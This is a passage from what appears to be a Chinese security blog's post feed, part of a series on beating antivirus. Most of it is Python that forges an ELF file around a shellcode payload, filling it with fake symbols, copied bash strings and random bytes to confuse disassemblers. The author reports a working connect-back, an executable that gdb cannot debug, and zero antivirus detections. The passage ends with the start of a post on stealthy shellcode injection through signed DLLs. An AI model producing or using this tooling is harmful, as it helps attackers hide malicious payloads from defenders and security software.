Elf64_Half st_shndx;    // Which section (header tbl index) it's defined in</span></span><br><span class="line"><span class="string">            Elf64_Addr st_value;    // Value or address associated with the symbol</span></span><br><span class="line"><span class="string">            Elf64_Xword st_size;    // Size of the symbol </span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    _pack_ = <span class="number">1</span></span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">"st_name"</span>,c.c_uint),</span><br><span class="line">        (<span class="string">"st_info"</span>,c.c_ubyte),</span><br><span class="line">        (<span class="string">"st_other"</span>,c.c_ubyte),</span><br><span class="line">        (<span class="string">"st_shndx"</span>,c.c_ushort),</span><br><span class="line">        (<span class="string">"st_value"</span>,c.c_ulonglong),</span><br><span class="line">        (<span class="string">"st_size"</span>,c.c_ulonglong)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ARCH == <span class="string">"x86"</span>:</span><br><span class="line">    ElfN_Sym = Elf32_Sym</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ElfN_Sym = Elf64_Sym</span><br></pre></td></tr></table></figure>

<p>ELF文件中的字符串也是一个表结构存储的，字符串表是用来存储ELF中会用的各种字符串的值，引用的时候只需要提供字符串索引就够了，为了方便字符串的管理和使用，我们这里定义一个类 <code>Elf_Str_Table</code> 来管理字符串。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Elf_Str_Table</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.__table = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self,string=None,strings=[])</span>:</span></span><br><span class="line">        <span class="comment"># 不能重复</span></span><br><span class="line">        <span class="keyword">if</span> string:</span><br><span class="line">            string = string.encode(<span class="string">"latin-1"</span>)</span><br><span class="line">            <span class="keyword">if</span> string <span class="keyword">not</span> <span class="keyword">in</span> self.__table:</span><br><span class="line">                self.__table.append(string)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> strings:</span><br><span class="line">            <span class="keyword">for</span> string <span class="keyword">in</span> strings:</span><br><span class="line">                string = string.encode(<span class="string">"latin-1"</span>)</span><br><span class="line">                <span class="keyword">if</span> string <span class="keyword">not</span> <span class="keyword">in</span> self.__table:</span><br><span class="line">                    self.__table.append(string)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print( self.__table )</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(self,string)</span>:</span></span><br><span class="line">        <span class="comment"># 找到 str 在表中的索引</span></span><br><span class="line">        string = string.encode(<span class="string">"latin-1"</span>)</span><br><span class="line">        <span class="keyword">if</span> string <span class="keyword">in</span> self.__table:</span><br><span class="line">            index = self.__table.index(string)</span><br><span class="line">            <span class="comment"># print(index)</span></span><br><span class="line">            <span class="keyword">return</span> len(self.dump( index=index ))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(self,index = <span class="number">-1</span>)</span>:</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> index == <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">b"\x00"</span> + <span class="string">b"\x00"</span>.join( self.__table ) + <span class="string">b"\x00"</span></span><br><span class="line">        <span class="keyword">elif</span> index == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">b"\x00"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">b"\x00"</span> + <span class="string">b"\x00"</span>.join( self.__table[<span class="number">0</span>:index] ) + <span class="string">b"\x00"</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rand</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># 随机选择一个符号的索引</span></span><br><span class="line">        rand_symbol = random.randint( <span class="number">0</span>,len(self.__table))</span><br><span class="line">        <span class="keyword">return</span> len(self.dump(index = rand_symbol))</span><br></pre></td></tr></table></figure>

<h3 id="操刀开始伪造"><a href="#操刀开始伪造" class="headerlink" title="操刀开始伪造"></a>操刀开始伪造</h3><p>我们先确定一个我们最终的ELF文件的布局结构：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">最终的 ELF 文件内容部分:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    | elf_header     |</span></span><br><span class="line"><span class="string">    | program_header | </span></span><br><span class="line"><span class="string">    | PT_NOTE        |</span></span><br><span class="line"><span class="string">    | shellcode      |</span></span><br><span class="line"><span class="string">    | PT_TLS         |</span></span><br><span class="line"><span class="string">    | .data.rel.ro   |</span></span><br><span class="line"><span class="string">    | .data          | # 也是一个需要加载的段</span></span><br><span class="line"><span class="string">    | shstrtab       | # 节名称字符串表的内容</span></span><br><span class="line"><span class="string">    | .strtab        |</span></span><br><span class="line"><span class="string">    | SYMTAB         |</span></span><br><span class="line"><span class="string">    | section_header |</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>

<p>然后再按照上面确定的布局依次填充内容，修改偏移就可了。首先需要伪造的第一必然是<code>.shstrtab</code> 节的内容，因为所有的其他节的名称都是使用的 <code>.shstrtab</code>字符串表的索引。然后依次伪造其他的节。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建 .shstrtab 节</span></span><br><span class="line">shstrtab_content = Elf_Str_Table()</span><br><span class="line">shstrtab_content.add(</span><br><span class="line">    strings = [ <span class="string">".note.ABI-tag"</span>,</span><br><span class="line">      <span class="string">".shstrtab"</span>,</span><br><span class="line">      <span class="string">".note.gnu.build-id"</span>,</span><br><span class="line">      <span class="string">".text"</span>,</span><br><span class="line">      <span class="string">".data.rel.ro"</span>,</span><br><span class="line">      <span class="string">".symtab"</span>,</span><br><span class="line">      <span class="string">".rodata"</span>,</span><br><span class="line">      <span class="string">".strtab"</span>,</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 .note.ABI-tag 节    </span></span><br><span class="line">elf_section_note_abi = ElfN_Shdr(</span><br><span class="line">    sh_name = shstrtab_content.index(<span class="string">".note.ABI-tag"</span>) , <span class="comment">#fix it </span></span><br><span class="line">    sh_type = <span class="number">0x7</span>,</span><br><span class="line">    sh_flags = <span class="number">0x2</span>,</span><br><span class="line">    sh_addr = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + MEM_VADDR ,</span><br><span class="line">    sh_offset = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN ,</span><br><span class="line">    sh_size = <span class="number">32</span>,</span><br><span class="line">    sh_link = <span class="number">0x0</span>,</span><br><span class="line">    sh_info = <span class="number">0x0</span>,</span><br><span class="line">    sh_addralign = <span class="number">0x4</span>,</span><br><span class="line">    sh_entsize = <span class="number">0x0</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 .note.gnu.build-id</span></span><br><span class="line">elf_section_note_gnu = ElfN_Shdr(</span><br><span class="line">    sh_name = shstrtab_content.index(<span class="string">".note.gnu.build-id"</span>) , <span class="comment">#fix it </span></span><br><span class="line">    sh_type = <span class="number">0x7</span>,</span><br><span class="line">    sh_flags = <span class="number">0x2</span>,</span><br><span class="line">    sh_addr = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + MEM_VADDR + <span class="number">32</span>,</span><br><span class="line">    sh_offset = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + <span class="number">32</span>  ,</span><br><span class="line">    sh_size = <span class="number">36</span>,</span><br><span class="line">    sh_link = <span class="number">0x0</span>,</span><br><span class="line">    sh_info = <span class="number">0x0</span>,</span><br><span class="line">    sh_addralign = <span class="number">0x4</span>,</span><br><span class="line">    sh_entsize = <span class="number">0x0</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 .text</span></span><br><span class="line"></span><br><span class="line">elf_section_text = ElfN_Shdr(</span><br><span class="line">    sh_name = shstrtab_content.index(<span class="string">".text"</span>) , <span class="comment">#fix it </span></span><br><span class="line">    sh_type = <span class="number">0x1</span>,</span><br><span class="line">    sh_flags = <span class="number">0x6</span>,</span><br><span class="line">    sh_addr = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN +  MEM_VADDR ,</span><br><span class="line">    sh_offset = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN,</span><br><span class="line">    sh_size = len(shellcode) ,</span><br><span class="line">    sh_link = <span class="number">0x0</span>,</span><br><span class="line">    sh_info = <span class="number">0x0</span>,</span><br><span class="line">    sh_addralign = <span class="number">0x4</span>,</span><br><span class="line">    sh_entsize = <span class="number">0x0</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 .data.rel.ro</span></span><br><span class="line">elf_section_data_rel = ElfN_Shdr(</span><br><span class="line">    sh_name = shstrtab_content.index(<span class="string">".data.rel.ro"</span>) , <span class="comment">#fix it </span></span><br><span class="line">    sh_type = <span class="number">0x1</span>,</span><br><span class="line">    sh_flags = <span class="number">0x3</span>,</span><br><span class="line">    sh_addr = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len( shellcode ) +  MEM_VADDR ,</span><br><span class="line">    sh_offset = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len( shellcode ),</span><br><span class="line">    sh_size = LOADABLE_LEN ,</span><br><span class="line">    sh_link = <span class="number">0x0</span>,</span><br><span class="line">    sh_info = <span class="number">0x0</span>,</span><br><span class="line">    sh_addralign = <span class="number">0x4</span>,</span><br><span class="line">    sh_entsize = <span class="number">0x0</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从其他软件中随便抠出来一点字符串来构建 .data 节</span></span><br><span class="line"><span class="comment"># 伪造一些/bin/bash的字符串</span></span><br><span class="line">data_content = Elf_Str_Table()</span><br><span class="line">data_content.add(</span><br><span class="line">    <span class="comment"># /bin/bash 的字符串</span></span><br><span class="line">    strings = [</span><br><span class="line">        <span class="string">"complete [-abcdefgjksuv] [-pr] [-DE] [-o option] [-A action] [-G globpat] [-W wordlist]  [-F function] [-C command] [-X filterpat] [-P prefix] [-S suffix] [name ...]"</span>,</span><br><span class="line">        <span class="string">"compgen [-abcdefgjksuv] [-o option] [-A action] [-G globpat] [-W wordlist]  [-F function] [-C command] [-X filterpat] [-P prefix] [-S suffix] [word]"</span>,</span><br><span class="line">        <span class="string">"compopt [-o|+o option] [-DE] [name ...]"</span>,</span><br><span class="line">        <span class="string">"mapfile [-d delim] [-n count] [-O origin] [-s count] [-t] [-u fd] [-C callback] [-c quantum] [array]"</span>,</span><br><span class="line">        <span class="string">"compopt [-o|+o option] [-DE] [name ...]"</span>,</span><br><span class="line">        <span class="string">"readarray [-n count] [-O origin] [-s count] [-t] [-u fd] [-C callback] [-c quantum] [array]"</span></span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">DATA_LEN = len( data_content.dump() )</span><br><span class="line">elf_section_data = ElfN_Shdr(</span><br><span class="line">    sh_name = shstrtab_content.index(<span class="string">".rodata"</span>) , <span class="comment">#fix it </span></span><br><span class="line">    sh_type = <span class="number">0x1</span>,</span><br><span class="line">    sh_flags = <span class="number">0x3</span>,</span><br><span class="line">    sh_addr = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) </span><br><span class="line">    + PT_TLS_LEN + LOADABLE_LEN + MEM_VADDR + <span class="number">0x1000</span>,</span><br><span class="line">    sh_offset = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) </span><br><span class="line">    + PT_TLS_LEN + LOADABLE_LEN ,</span><br><span class="line">    sh_size = DATA_LEN,</span><br><span class="line">    sh_link = <span class="number">0x0</span>,</span><br><span class="line">    sh_info = <span class="number">0x0</span>,</span><br><span class="line">    sh_addralign = <span class="number">0x1</span>,</span><br><span class="line">    sh_entsize = <span class="number">0x0</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">SHSTRTAB_LEN = len( shstrtab_content.dump() )</span><br><span class="line">elf_section_shstrtab = ElfN_Shdr(</span><br><span class="line">    sh_name = shstrtab_content.index(<span class="string">".shstrtab"</span>) , <span class="comment">#fix it </span></span><br><span class="line">    sh_type = <span class="number">0x3</span>,</span><br><span class="line">    sh_flags = <span class="number">0x0</span>,</span><br><span class="line">    sh_addr = <span class="number">0x0</span>,</span><br><span class="line">    sh_offset = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) </span><br><span class="line">    + PT_TLS_LEN + LOADABLE_LEN + DATA_LEN ,</span><br><span class="line">    sh_size = SHSTRTAB_LEN,</span><br><span class="line">    sh_link = <span class="number">0x0</span>,</span><br><span class="line">    sh_info = <span class="number">0x0</span>,</span><br><span class="line">    sh_addralign = <span class="number">0x1</span>,</span><br><span class="line">    sh_entsize = <span class="number">0x0</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 .strtab</span></span><br><span class="line">VERB = [<span class="string">"read"</span>,<span class="string">"write"</span>,<span class="string">"get"</span>,<span class="string">"set"</span>,<span class="string">"thread"</span>,<span class="string">"start"</span>,<span class="string">"stop"</span>,<span class="string">"close"</span>,<span class="string">"free"</span>,<span class="string">"_IO"</span>]</span><br><span class="line">NOUN = [<span class="string">"name"</span>,<span class="string">"value"</span>,<span class="string">"thread"</span>,<span class="string">"server"</span>,<span class="string">"remote"</span>,<span class="string">"age"</span>,<span class="string">"table"</span>]</span><br><span class="line">strtab_content = Elf_Str_Table()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    tmp = random.choice( VERB ) + <span class="string">"_"</span> + random.choice( NOUN )</span><br><span class="line">    strtab_content.add( string=tmp )</span><br><span class="line"></span><br><span class="line">STRTAB_LEN = len(strtab_content.dump())</span><br><span class="line">elf_section_strtab = ElfN_Shdr(</span><br><span class="line">    sh_name = shstrtab_content.index(<span class="string">".strtab"</span>) , <span class="comment">#fix it </span></span><br><span class="line">    sh_type = <span class="number">0x3</span>,</span><br><span class="line">    sh_flags = <span class="number">0x0</span>,</span><br><span class="line">    sh_addr = <span class="number">0x0</span>,</span><br><span class="line">    sh_offset = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) </span><br><span class="line">    + LOADABLE_LEN + PT_TLS_LEN + DATA_LEN + SHSTRTAB_LEN ,</span><br><span class="line">    sh_size = STRTAB_LEN,</span><br><span class="line">    sh_link = <span class="number">0x0</span>,</span><br><span class="line">    sh_info = <span class="number">0x0</span>,</span><br><span class="line">    sh_addralign = <span class="number">0x1</span>,</span><br><span class="line">    sh_entsize = <span class="number">0x0</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>下面才是我们的重头戏，开始伪造我们的符号表：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 伪造 .symtab 节的数据</span></span><br><span class="line"></span><br><span class="line">sym_list = []</span><br><span class="line">sym_list_len = <span class="number">10</span></span><br><span class="line"><span class="comment"># 在 .text 节伪造 10 个函数符号</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(sym_list_len):</span><br><span class="line"></span><br><span class="line">        sym_tmp = ElfN_Sym(</span><br><span class="line">            st_name = strtab_content.rand(),</span><br><span class="line">            st_info = (<span class="number">0</span> &lt;&lt; <span class="number">4</span> | <span class="number">2</span>),</span><br><span class="line">            st_other = <span class="number">0</span>,</span><br><span class="line">            st_shndx = <span class="number">0x3</span>, <span class="comment"># 所在的节索引，.text节</span></span><br><span class="line">            <span class="comment"># st_value = MEM_VADDR +  c.sizeof( ElfN_Ehdr ) + \</span></span><br><span class="line">            <span class="comment"># c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + len(shellcode) +  PT_NOTE_LEN  + PT_TLS_LEN + i*0x30 ,</span></span><br><span class="line">            st_value = MEM_VADDR  + c.sizeof( ElfN_Ehdr ) + \</span><br><span class="line">            c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + i*<span class="number">0x20</span> ,</span><br><span class="line">            <span class="comment"># st_value = 0x08048118,</span></span><br><span class="line">            st_size = <span class="number">0x20</span>,</span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># sym_tmp = ElfN_Sym()</span></span><br><span class="line">        sym_list.append(sym_tmp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(sym_list_len):</span><br><span class="line">    <span class="comment"># 在第二个可加载段中伪造 10 个函数符号</span></span><br><span class="line">    sym_tmp = ElfN_Sym(</span><br><span class="line">        st_name = strtab_content.rand(),</span><br><span class="line">        st_info = (<span class="number">0</span> &lt;&lt; <span class="number">4</span> | <span class="number">2</span>),</span><br><span class="line">        st_other = <span class="number">0</span>,</span><br><span class="line">        st_shndx = <span class="number">0x3</span>, <span class="comment"># 所在的节索引，.text节</span></span><br><span class="line">        <span class="comment"># st_value = MEM_VADDR +  c.sizeof( ElfN_Ehdr ) + \</span></span><br><span class="line">        <span class="comment"># c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + len(shellcode) +  PT_NOTE_LEN  + PT_TLS_LEN + i*0x30 ,</span></span><br><span class="line">        st_value = MEM_VADDR  + c.sizeof( ElfN_Ehdr ) + \</span><br><span class="line">        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) + <span class="number">0x1000</span> + i*<span class="number">0x40</span> ,</span><br><span class="line">        <span class="comment"># st_value = 0x08048118,</span></span><br><span class="line">        st_size = <span class="number">0x40</span>,</span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># sym_tmp = ElfN_Sym()</span></span><br><span class="line">    sym_list.append(sym_tmp)</span><br><span class="line"></span><br><span class="line">sym_list_len = len(sym_list)</span><br><span class="line">elf_section_symtab = ElfN_Shdr(</span><br><span class="line">    sh_name = shstrtab_content.index(<span class="string">".symtab"</span>) , <span class="comment">#fix it </span></span><br><span class="line">    sh_type = <span class="number">0x2</span>,</span><br><span class="line">    sh_flags = <span class="number">0x0</span>,</span><br><span class="line">    sh_addr = <span class="number">0x0</span>,</span><br><span class="line">    sh_offset = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) </span><br><span class="line">    + LOADABLE_LEN + PT_TLS_LEN + DATA_LEN + SHSTRTAB_LEN + STRTAB_LEN ,</span><br><span class="line">    sh_size = sym_list_len * c.sizeof( ElfN_Sym ),</span><br><span class="line">    sh_link = <span class="number">0x7</span>,</span><br><span class="line">    sh_info = <span class="number">0</span>, <span class="comment">#  a symbol table section's sh_info section header member holds the symbol table index for the first non-local symbol.</span></span><br><span class="line">    sh_addralign = <span class="number">0x4</span>,</span><br><span class="line">    sh_entsize =  c.sizeof( ElfN_Sym )</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>注意<code>.symtab</code>节表的 <code>sh_info</code> 表达的含义，乱写可能会导致ida解析出错(被这个问题卡了很久)。最后我们将伪造的所有数据写入一个ELF文件：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">    </span><br><span class="line">elf_section_undef = ElfN_Shdr(</span><br><span class="line">    sh_name = <span class="number">0x0</span>,</span><br><span class="line">    sh_type = <span class="number">0x0</span>,</span><br><span class="line">    sh_flags = <span class="number">0x0</span>,</span><br><span class="line">    sh_addr = <span class="number">0x0</span>,</span><br><span class="line">    sh_offset = <span class="number">0x0</span>,</span><br><span class="line">    sh_link = <span class="number">0x0</span>,</span><br><span class="line">    sh_info = <span class="number">0x0</span>,</span><br><span class="line">    sh_addralign = <span class="number">0x0</span>,</span><br><span class="line">    sh_entsize = <span class="number">0x0</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">sections = [</span><br><span class="line">    elf_section_undef,</span><br><span class="line">    elf_section_note_abi,</span><br><span class="line">    elf_section_note_gnu,</span><br><span class="line">    elf_section_text,</span><br><span class="line">    elf_section_data_rel,</span><br><span class="line">    elf_section_data,</span><br><span class="line">    elf_section_symtab,</span><br><span class="line">    elf_section_strtab,</span><br><span class="line">    elf_section_shstrtab,</span><br><span class="line">]</span><br><span class="line">elf_section_symtab.sh_link = sections.index( elf_section_strtab )</span><br><span class="line">e_shoff = elf_section_symtab.sh_offset + elf_section_symtab.sh_size</span><br><span class="line">e_shoff_pad = <span class="number">4</span> + (<span class="number">4</span> - (e_shoff &amp; <span class="number">3</span>)) &amp; <span class="number">3</span></span><br><span class="line"></span><br><span class="line">elf_header.e_shoff = elf_section_symtab.sh_offset + elf_section_symtab.sh_size + e_shoff_pad</span><br><span class="line">elf_header.e_shstrndx = len( sections ) - <span class="number">1</span></span><br><span class="line">elf_header.e_shnum = len( sections )</span><br><span class="line">elf_header.e_shentsize = c.sizeof( ElfN_Shdr )</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">with</span> open(FILENAME,<span class="string">"wb"</span>) <span class="keyword">as</span> fd:</span><br><span class="line">    elf_header_bytes = c.string_at(c.addressof(elf_header),c.sizeof(elf_header))</span><br><span class="line">    fd.write( elf_header_bytes)</span><br><span class="line">    <span class="keyword">for</span> ph <span class="keyword">in</span> pheaders:</span><br><span class="line">        fd.write( c.string_at( c.addressof(ph),c.sizeof(ph) ) )</span><br><span class="line">    </span><br><span class="line">    fd.write( bytes([ random.randint(<span class="number">0x00</span>,<span class="number">0xff</span>) <span class="keyword">for</span> i <span class="keyword">in</span>  range(PT_NOTE_LEN)]  ) )</span><br><span class="line">    fd.write(shellcode)</span><br><span class="line">    fd.write( bytes( [ random.randint(<span class="number">0x00</span>,<span class="number">0xff</span>) <span class="keyword">for</span> i <span class="keyword">in</span>  range(PT_TLS_LEN)] )  )</span><br><span class="line">    fd.write( bytes( [ random.randint(<span class="number">0x00</span>,<span class="number">0xff</span>) <span class="keyword">for</span> i <span class="keyword">in</span>  range(LOADABLE_LEN)] ) )</span><br><span class="line">    fd.write( data_content.dump() )</span><br><span class="line">    fd.write( shstrtab_content.dump() )</span><br><span class="line">    fd.write( strtab_content.dump() )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 写入符号</span></span><br><span class="line">    <span class="keyword">for</span> tmp <span class="keyword">in</span> sym_list:</span><br><span class="line">        fd.write( c.string_at( c.addressof(tmp),c.sizeof(tmp) ) )</span><br><span class="line">    </span><br><span class="line">    fd.write( <span class="string">b"\x00"</span> * e_shoff_pad  )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> se <span class="keyword">in</span> sections:</span><br><span class="line">        fd.write( c.string_at( c.addressof(se),c.sizeof(se) ) )</span><br></pre></td></tr></table></figure>

<h2 id="检查最后的伪造效果"><a href="#检查最后的伪造效果" class="headerlink" title="检查最后的伪造效果"></a>检查最后的伪造效果</h2><p>在进行符号伪造之前，代码相对来讲还是比较清晰可见的。</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/20210727110004.png" alt=""></p>
<p>进行符号伪造之后，所有的一切都看起来非常的凌乱。</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/20210727110144.png" alt=""></p>
<p>其实这里的符号信息就类似于自然语言中的断句，们相当于随意的插入了一些标点符号，导致反编译结果混糅杂乱。</p>
<p>这个二进制功能是正常的，可以成功回连。<br><img src="https://pic.wonderkun.cc//uploads/note/20210727111139.png" alt=""></p>
<p>除此之外，还有一个意外收获，这个二进制gdb无法调试。</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/20210727111346.png" alt=""></p>
<p>至于为什么无法被gdb加载，我们日后再写文章进行详细的解释。<br>最后看一下免杀效果，其实都不用看，肯定是妥妥的0查杀呗。</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/20210727114505.png" alt=""></p>
<p>虽然本文费尽心机做了一些障眼法，但是也只是能够欺骗静态的杀毒引擎以及没有经验的安全工作人员，并不能真正的增加人工分析的难度，所以在下一篇文章中我决定进一步的编写花指令生成和指令混淆等功能。本文到此为止，后续敬请期待…..</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>杀软的无奈</tag>
      </tags>
  </entry>
  <entry>
    <title>杀软的无奈-汇编层的指令混淆(六)</title>
    <url>/2021/08/02/%E6%9D%80%E8%BD%AF%E7%9A%84%E6%97%A0%E5%A5%88-%E6%B1%87%E7%BC%96%E5%B1%82%E7%9A%84%E6%8C%87%E4%BB%A4%E6%B7%B7%E6%B7%86(%E5%85%AD)%20/</url>
    <content><![CDATA[<div id="hbe-security">
  <div class="hbe-input-container">
  <input type="password" class="hbe-form-control" id="pass" placeholder="Please enter the password to read the blog." />
    <label for="pass">Please enter the password to read the blog.</label>
    <div class="bottom-line"></div>
  </div>
</div>
<div id="decryptionError" style="display: none;">Incorrect Password!</div>
<div id="noContentError" style="display: none;">No content to display!</div>
<div id="encrypt-blog" style="display:none">
U2FsdGVkX18wc/myjylJTIaVz805B/peyTalNh8z6Ls=
</div>
<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>杀软的无奈</tag>
      </tags>
  </entry>
  <entry>
    <title>滥用具备RWX-S权限且有签名的dll进行无感知的shellcode注入</title>
    <url>/2022/04/16/%E6%BB%A5%E7%94%A8%E5%85%B7%E5%A4%87RWX-S%E6%9D%83%E9%99%90%E4%B8%94%E6%9C%89%E7%AD%BE%E5%90%8D%E7%9A%84dll%E8%BF%9B%E8%A1%8C%E6%97%A0%E6%84%9F%E7%9F%A5%E7%9A%84shellcode%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>常规的shellcode注入一般是通过<code>VirtualAllocEx</code>,<code>WriteProcessMemory</code> 和 <code>CreateRemoteThread</code> 来实现的，但是这种方式是被安全软件重点监控的，同时微软提供的ETW接口也是可以轻易检测出上述方式进行代码注入的痕迹。本文的核心是讲解怎么利用具备 RWX-S 权限且自身有签名的白DLL进行一种比较隐蔽的shellcode注入，<br>并讲解具体的代码实现以及在写代码实现的过程中遇到的坑。本方法是由文章提出的：<a href="https://billdemirkapi.me/sharing-is-caring-abusing-shared-sections-for-code-injection/" target="_blank" rel="noopener">https://billdemirkapi.me/sharing-is-caring-abusing-shared-sections-for-code-injection/</a> ，详情可以参考此文章。</p>
<p>我的知识星球开启内测了，用微信扫描下面的小程序就可以免费加入，来和我一起学习安全技术。(在圈子内可以下载到源代码)</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/202204272138408.png" alt=""></p>
<a id="more"></a>
<h2 id="基础知识回顾"><a href="#基础知识回顾" class="headerlink" title="基础知识回顾"></a>基础知识回顾</h2><p>PE文件的每个section都具备自己的权限，表明他被映射到虚拟内存之后的操作权限，也就是 <code>SECTION_CHARACTERISTICS</code> 这个字段，占四个字节。<br>通常来讲 <code>.text</code> 节区只具备 <code>IMAGE_SCN_MEM_READ</code> 和 <code>IMAGE_SCN_MEM_EXECUTE</code> 权限，<code>.data</code> 节区一般只具备 <code>IMAGE_SCN_MEM_READ</code>,<code>IMAGE_SCN_MEM_WRITE</code> 权限。 当PE文件被映射到内存后，对一个不具备 <code>IMAGE_SCN_MEM_WRITE</code> 权限的节区进行写操作或者对一个没有 <code>IMAGE_SCN_MEM_EXECUTE</code> 的节区进行执行时，都会报异常。</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/202204181752550.png" alt=""></p>
<p>看微软的文档：<a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#section-flags" target="_blank" rel="noopener">document</a>, 会发现一个权限叫做 <code>IMAGE_SCN_MEM_SHARED</code>。 那共享到底意味着什么？据测试显示：<strong>具备此权限的section会被当前系统所有的进程共享，如果进程A和进程B都加载了具备IMAGE_SCN_MEM_SHARED权限的模块C，那么模块C的此section在系统层面上只有一份，这也就意味着A进程对C的修改（有IMAGE_SCN_MEM_WRITE权限）会影响到B进程</strong></p>
